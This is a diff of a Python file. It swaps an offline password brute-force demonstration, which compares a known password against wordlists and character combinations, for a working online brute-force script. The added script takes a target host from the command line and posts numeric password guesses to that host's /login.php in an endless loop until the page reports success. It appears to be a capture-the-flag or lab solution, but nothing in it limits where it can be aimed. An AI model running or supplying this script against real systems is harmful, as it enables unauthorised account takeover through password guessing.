@@ -1,88 +1,28 @@
-"""
-Password brute-force algorithm.
-List of most probable passwords and english names can be found, respectively, at:
-- https://github.com/danielmiessler/SecLists/blob/master/Passwords/probable-v2-top12000.txt
-- https://github.com/dominictarr/random-name/blob/master/middle-names.txt
-Author: Raphael Vallat
-Date: May 2018
-Python 3
-"""
-import string
-from itertools import product
-from time import time
-from numpy import loadtxt
+import requests
+import sys
 
+def bruteforce(rhost):
 
-def product_loop(password, generator):
-    for p in generator:
-        if ''.join(p) == password:
-            print('\nPassword:', ''.join(p))
-            return ''.join(p)
-    return False
+  i = 240610608
+  while 1:
 
+    url = "http://{}/login.php".format(rhost)
 
-def bruteforce(password, max_nchar=8):
-    """Password brute-force algorithm.
-    Parameters
-    ----------
-    password : string
-        To-be-found password.
-    max_nchar : int
-        Maximum number of characters of password.
-    Return
-    ------
-    bruteforce_password : string
-        Brute-forced password
-    """
-    print('1) Comparing with most common passwords / first names')
-    common_pass = loadtxt('probable-v2-top12000.txt', dtype=str)
-    common_names = loadtxt('middle-names.txt', dtype=str)
-    cp = [c for c in common_pass if c == password]
-    cn = [c for c in common_names if c == password]
-    cnl = [c.lower() for c in common_names if c.lower() == password]
+    headers = {"Content-Type": "application/x-www-form-urlencoded"}
+    data = {"password": i}
+    r = requests.post(url, headers=headers, data=data)
+    print(i)
+    if "you have been autheticated!" in r.text:
+        print("Found Password! = {}".format(i))
+        return i
+    i+=1
 
-    if len(cp) == 1:
-        print('\nPassword:', cp)
-        return cp
-    if len(cn) == 1:
-        print('\nPassword:', cn)
-        return cn
-    if len(cnl) == 1:
-        print('\nPassword:', cnl)
-        return cnl
+def main():
+    rhost = sys.argv[1]
+    bruteforce(rhost)
+  
 
-    print('2) Digits cartesian product')
-    for l in range(1, 9):
-        generator = product(string.digits, repeat=int(l))
-        print("\t..%d digit" % l)
-        p = product_loop(password, generator)
-        if p is not False:
-            return p
+if __name__ == "__main__":
+    main()
 
-    print('3) Digits + ASCII lowercase')
-    for l in range(1, max_nchar + 1):
-        print("\t..%d char" % l)
-        generator = product(string.digits + string.ascii_lowercase,
-                            repeat=int(l))
-        p = product_loop(password, generator)
-        if p is not False:
-            return p
-
-    print('4) Digits + ASCII lower / upper + punctuation')
-    # If it fails, we start brute-forcing the 'hard' way
-    # Same as possible_char = string.printable[:-5]
-    all_char = string.digits + string.ascii_letters + string.punctuation
-
-    for l in range(1, max_nchar + 1):
-        print("\t..%d char" % l)
-        generator = product(all_char, repeat=int(l))
-        p = product_loop(password, generator)
-        if p is not False:
-            return p
-
-
-# EXAMPLE
-start = time()
-bruteforce('sunshine') # Try with '123456' or '751345' or 'test2018'
-end = time()
-print('Total time: %.2f seconds' % (end - start))
+  
